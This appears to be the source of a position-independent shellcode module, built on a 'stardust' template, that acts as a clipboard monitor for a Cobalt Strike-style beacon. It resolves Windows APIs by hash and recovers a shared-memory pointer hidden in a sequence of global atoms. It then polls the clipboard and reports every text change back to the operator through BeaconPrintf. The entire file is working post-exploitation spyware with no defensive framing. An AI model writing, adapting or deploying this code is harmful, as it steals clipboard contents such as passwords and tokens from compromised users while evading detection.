#include <common.h>
#include <constexpr.h>
#include <resolve.h>

using namespace stardust;

extern "C" auto declfn entry(
    _In_ void* args
) -> void {
    stardust::instance()
        .start( args );
}

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_ERROR       0x0d
#define ATOM_SUFFIX L"clipboardmon"

declfn instance::instance(
    void
) {
    //
    // calculate the shellcode base address + size
    base.address = RipStart();
    base.length  = ( RipData() - base.address ) + END_OFFSET;

    //
    // load the modules from PEB or any other desired way
    //

    if ( ! (( ntdll.handle = resolve::module( expr::hash_string<wchar_t>( L"ntdll.dll" ) ) )) ) {
        return;
    }

    if ( ! (( kernel32.handle = resolve::module( expr::hash_string<wchar_t>( L"kernel32.dll" ) ) )) ) {
        return;
    }

    //
    // let the macro handle the resolving part automatically
    //

    RESOLVE_IMPORT( ntdll );
    RESOLVE_IMPORT( kernel32 );

    if ( ! (( user32.handle = reinterpret_cast<uintptr_t>( kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) ) ) )) ) {
        return;
    }
    RESOLVE_IMPORT( user32 );
}


auto declfn instance::GetMemAddr() -> pSharedData {
    size_t address = 0;
    WCHAR atomName[] = L"\x01" ATOM_SUFFIX;

    // Loop over 64 bits in x64 size_t
    for (int count = 0; count < sizeof(size_t) * 8; count++)
    {
        // Check whether Atom exists. If yes, bit = 1, if no bit = 0
        size_t bit = kernel32.FindAtomW(atomName) == 0 ? 0 : 1;

        // Shift bit left <count> places then use OR assignment to set address
        address |= (bit << count);

        // Increment first byte in atomName to create atom name for next loop
        atomName[0] += 1;
    }

    return (pSharedData)address;
}

auto declfn instance::start(
    _In_ void* arg
) -> void {
    typedef void (WINAPI *_BeaconPrintf)(int type, const char* fmt, ...);
    // Resolve struct address
    pSharedData sd = instance::GetMemAddr();
    _BeaconPrintf BeaconPrintf = (_BeaconPrintf)sd->pBeaconPrintf;

    DWORD lastSeq = 0;
    do {
        DWORD currentSeq = user32.GetClipboardSequenceNumber();

        if (currentSeq != lastSeq) {
            lastSeq = currentSeq;

            if (user32.OpenClipboard(NULL)) {
                HANDLE hData = user32.GetClipboardData(CF_TEXT);
                if (hData != NULL) {
                    char *pszText = (char*)kernel32.GlobalLock(hData);
                    if (pszText != NULL) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard changed:\n%s", pszText);
                        kernel32.GlobalUnlock(hData);
                    }
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard changed (non-text data or empty)");
                }
                user32.CloseClipboard();
            } else {
                BeaconPrintf(CALLBACK_ERROR, "Failed to open clipboard\n");
            }
        }
    } while (kernel32.WaitForSingleObject(sd->hEvent, 500) == WAIT_TIMEOUT);
    BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon exiting...");
}
